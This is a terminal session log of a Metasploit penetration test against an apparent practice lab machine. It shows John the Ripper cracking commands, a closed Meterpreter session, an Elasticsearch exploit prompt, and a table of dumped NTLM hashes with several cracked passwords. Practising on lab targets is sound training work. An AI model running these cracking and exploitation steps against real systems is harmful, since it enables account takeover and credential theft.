+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=cpnabtG9 --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm --incremental=Digits /tmp/hashes_tmp20230504-10618-tl5de3
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+[1m[34m[*][0m Cracking lm hashes in wordlist mode...
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=cpnabtG9 --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=lm --wordlist=/tmp/jtrtmp20230504-10618-cf9a6z --rules=wordlist /tmp/hashes_tmp20230504-10618-tl5de3
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+[1m[32m[+][0m Cracked Hashes
+==============
+
+ DB ID  Hash Type  Username  Cracked Password  Method
+ -----  ---------  --------  ----------------  ------
+
+[1m[34m[*][0m Checking nt hashes already cracked...
+[1m[34m[*][0m Cracking nt hashes in single mode...
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=GKaO7zaV --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=nt --wordlist=/tmp/jtrtmp20230504-10618-cf9a6z --rules=single /tmp/hashes_tmp20230504-10618-tl5de3
+Using default input encoding: UTF-8
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+0g 0:00:00:05 DONE (2023-05-04 19:40) 0g/s 14114Kp/s 14114Kc/s 211722KC/s zwelethu1900..vagrant1900
+Session completed. 
+[1m[34m[*][0m Cracking nt hashes in normal mode
+[1m[34m[*][0m    Cracking Command: /usr/sbin/john --session=GKaO7zaV --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=nt /tmp/hashes_tmp20230504-10618-tl5de3
+Using default input encoding: UTF-8
+Warning: no OpenMP support for this hash type, consider --fork=2
+Proceeding with single, rules:Single
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+Proceeding with incremental:ASCII
+
+[1m[34m[*][0m 192.168.56.198 - Meterpreter session 1 closed.  Reason: Died
+^CWait...0g 0:00:40:35  3/3 0g/s 38245Kp/s 38245Kc/s 611935KC/s jcrrbsk39..jcrrbs385
+Session aborted
+[1m[31m[-][0m Stopping running against current target...
+[1m[34m[*][0m Control-C again to force quit all targets.
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf6[0m auxiliary([1m[31manalyze/crack_windows[0m) [0m> Interrupt: use the 'exit' command to quit
+[4mmsf6[0m auxiliary([1m[31manalyze/crack_windows[0m) [0m> creds
+[0mCredentials
+===========
+
+host            origin          service        public            private                                                            realm  private_type    JtR Format
+----            ------          -------        ------            -------                                                            -----  ------------    ----------
+192.168.56.198  192.168.56.198  445/tcp (smb)  anakin_skywalker  aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  artoo_detoo       aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  ben_kenobi        aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  boba_fett         aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  chewbacca         aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  c_three_pio       aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  darth_vader       aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  greedo            aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  han_solo          aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  IEUser            aad3b435b51404eeaad3b435b51404ee:d74b7de08bd26576df504ffc0e28fc12         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  jabba_hutt        aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  jarjar_binks      aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  kylo_ren          aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  lando_calrissian  aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  leah_organa       aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  luke_skywalker    aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  SkipKiddie        aad3b435b51404eeaad3b435b51404ee:179a5f848f16414d03aea72d90eac696         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  administrator     aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  guest             aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  ieuser            aad3b435b51404eeaad3b435b51404ee:d74b7de08bd26576df504ffc0e28fc12         NTLM hash       nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  skipkiddie        aad3b435b51404eeaad3b435b51404ee:179a5f848f16414d03aea72d90eac696         NTLM hash       nt,lm
+192.168.56.198                  445/tcp (smb)  administrator                                                                               Blank password  
+192.168.56.198                  445/tcp (smb)  guest                                                                                       Blank password  
+192.168.56.198                  445/tcp (smb)  c_three_pio       pr0t0c0l                                                                  Password        
+192.168.56.198                  445/tcp (smb)  SkipKiddie        WhoopWhoop                                                                Password        
+192.168.56.198                  445/tcp (smb)  skipkiddie        WhoopWhoop                                                                Password        
+
+[4mmsf6[0m auxiliary([1m[31manalyze/crack_windows[0m) [0m> exit
+[0m                                                                                                                                                                      ]0;root@kali: /home/kali/Desktop/final
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali/Desktop/final[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[1me[0m[0m[36me[36mx[39m[39m[4me[39m[4mx[4mi[24m[24m[36me[24m[36mx[24m[36mi[36mt[39m[?1l>[?2004l
+
+Script done on 2023-05-04 21:31:44-04:00 [COMMAND_EXIT_CODE="0"]
+^C
+Terminate channel 6? [y/N]  y
+[1m[31m[-][0m Error running command shell: Rex::TimeoutError Send timed out
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> exit
+[0m                                                                                                                                                                      ]0;root@kali: /home/kali/Desktop/final
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali/Desktop/final[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[1me[0m[0m[36me[36mx[39m[39m[4me[39m[4mx[4mi[24m[24m[36me[24m[36mx[24m[36mi[36mt[39m[?1l>[?2004l
+zsh: you have suspended jobs.
+                                                                                                                                                                      ]0;root@kali: /home/kali/Desktop/final
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali/Desktop/final[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[1me[0m[1me[0m[38;2;153;153;153mxit[39m[0m[36me[36mx[39m[39m[4me[39m[4mx[39m[4mi[24m[24m[36me[24m[36mx[24m[36mi[36mt[39m[?1l>[?2004l
+
+Script done on 2023-05-04 21:32:19-04:00 [COMMAND_EXIT_CODE="0"]
